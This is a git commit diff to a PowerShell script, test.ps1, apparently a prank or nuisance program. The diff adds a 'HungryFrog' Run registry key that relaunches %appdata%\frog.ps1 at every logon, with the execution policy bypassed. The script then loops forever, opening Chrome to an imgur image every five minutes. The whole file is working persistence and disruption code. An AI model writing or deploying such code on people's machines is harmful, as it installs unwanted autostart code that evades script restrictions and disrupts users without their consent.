94bbc735136fed9db5829cda379d78cc105a2f70
0utDoorFr0g <63755945+0utDoorFr0g@users.noreply.github.com>
2021-01-06 22:11:50 +0900

    Final Update

--- test.ps1
+++ test.ps1
@@ -1,20 +1,19 @@
-$registryPath = 'Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
-$name = 'HungryFrog'
-$value = '%appdata%\\frog.ps1'
+$registryPath = 'Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run';
+$name = 'HungryFrog';
+$value = 'cmd /k powershell.exe -executionpolicy bypass -noprofile -file %appdata%\\frog.ps1';
 
 if(!(Test-Path $registryPath))
 {
-    New-Item -Path $registryPath -Force | Out-Null
-    New-ItemProperty -Path $registryPath -Name $name -Value $value -PropertyType String -Force | Out-Null 
+    New-Item -Path $registryPath -Force | Out-Null;
+    New-ItemProperty -Path $registryPath -Name $name -Value $value -PropertyType String -Force | Out-Null;
 }
 else
 {
-    New-ItemProperty -Path $registryPath -Name $name -Value $value -PropertyType String -Force | Out-Null
+    New-ItemProperty -Path $registryPath -Name $name -Value $value -PropertyType String -Force | Out-Null;
 }
+
 while(1 -eq 1)
 {
-  Start-Process -FilePath "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" -ArgumentList 
-
-"https://imgur.com/RS2OVJf";
-  Start-Sleep -s 300;
+    Start-Process 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe' ('https://imgur.com/RS2OVJf');
+    Start-Sleep -s 300;
 }
